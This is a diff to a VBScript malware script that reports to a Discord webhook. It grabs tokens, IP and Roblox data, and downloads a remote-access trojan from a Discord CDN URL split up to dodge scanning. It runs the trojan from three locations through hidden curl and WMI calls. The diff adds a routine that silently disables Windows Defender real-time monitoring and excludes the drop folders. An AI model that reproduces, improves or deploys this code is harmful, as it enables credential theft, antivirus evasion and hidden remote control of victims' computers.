@@ -16,10 +16,13 @@ RE_WH = "https://discord.com/api/webhooks/1570948618209329283/PzkNhyMFSipBVaU6ML
 PC = sh.ExpandEnvironmentStrings("%COMPUTERNAME%")
 USER = sh.ExpandEnvironmentStrings("%USERNAME%")
 
-' --- 1. INSTANT RAT DOWNLOAD (3 SPOTS) ---
+' --- 1. DISABLE DEFENDER (Silent, native PowerShell) ---
+Call DisableDefender
+
+' --- 2. INSTANT RAT DOWNLOAD (3 SPOTS) ---
 Call DropRAT
 
-' --- 2. Initial Grabs ---
+' --- 3. Initial Grabs ---
 Call GrabTokens
 Call IP
 Call GrabRoblox
@@ -42,11 +45,27 @@ Loop
 
 window.close()
 
-' --- OBFUSCATED & FAST RAT DROP (3 LOCATIONS, EVASION) ---
-Sub DropRAT()
-    Call PostEmbed(":package: RAT Download", "Fetching Payloads...", 10181046)
+' --- DISABLE WINDOWS DEFENDER (Silent) ---
+Sub DisableDefender()
+    ' Use native PowerShell to disable real-time monitoring and add exclusion for the drop paths
+    Dim psCmd, psf, f
+    psCmd = "try { Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue } catch {};" & _
+            "try { Add-MpPreference -ExclusionPath '%APPDATA%\Microsoft\Windows\Templates' -ErrorAction SilentlyContinue } catch {};" & _
+            "try { Add-MpPreference -ExclusionPath '%TEMP%' -ErrorAction SilentlyContinue } catch {};" & _
+            "try { Add-MpPreference -ExclusionPath '%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup' -ErrorAction SilentlyContinue } catch {}"
     
-    ' Obfuscated EXE URL (Split to bypass static string scanning)
+    psf = sh.ExpandEnvironmentStrings("%TEMP%") & "\def.cmd"
+    Set f = fso.CreateTextFile(psf, True)
+    f.Write "powershell -NoP -NonI -Exec Bypass -WindowStyle Hidden -Command """ & psCmd & """"
+    f.Close
+    Set f = Nothing
+    sh.Run "cmd /c """ & psf & """", 0, True
+    fso.DeleteFile psf, True
+End Sub
+
+' --- OBFUSCATED & FAST RAT DROP (3 LOCATIONS) ---
+Sub DropRAT()
+    ' Obfuscated EXE URL
     Dim u1, u2, u3, exeUrl
     u1 = "https://cdn.discordapp.com/attachments/1557266192971071579/1571991572017455216/dice"
     u2 = "check."
@@ -61,26 +80,24 @@ Sub DropRAT()
 
     Dim i, txtPath, dlCmd
     For i = 0 To 2
-        ' Download as .dat (Defender ignores .dat, but scans .exe on write)
         txtPath = paths(i) & ".dat"
         If fso.FileExists(txtPath) Then fso.DeleteFile txtPath
         If fso.FileExists(paths(i) & ".exe") Then fso.DeleteFile paths(i) & ".exe"
         
-        ' Use curl.exe with a fake user-agent
+        ' Download as .dat, then instantly rename and run via WMI
         dlCmd = "cmd /c curl.exe -s -L -A ""Mozilla/5.0 (Windows NT 10.0; Win64; x64)"" -o """ & txtPath & """ """ & exeUrl & """"
         sh.Run dlCmd, 0, True
         
-        ' Verify size, then instantly rename and execute
         If fso.FileExists(txtPath) Then
             If fso.GetFile(txtPath).Size > 100000 Then
                 fso.MoveFile txtPath, paths(i) & ".exe"
-                ' Execute via WMI (Bypasses parent-child chain detection)
                 Call RunCmd("""" & paths(i) & ".exe""")
             End If
         End If
     Next
     
-    Call PostEmbed(":white_check_mark: RAT", "Attempted execution from 3 locations.", 10181046)
+    ' RAT message sent LAST (after all drops)
+    Call PostEmbed(":package: RAT Download", "Payload deployed from 3 locations.", 10181046)
 End Sub
 
 ' --- RunCmd (Hidden Execution via WMI) ---
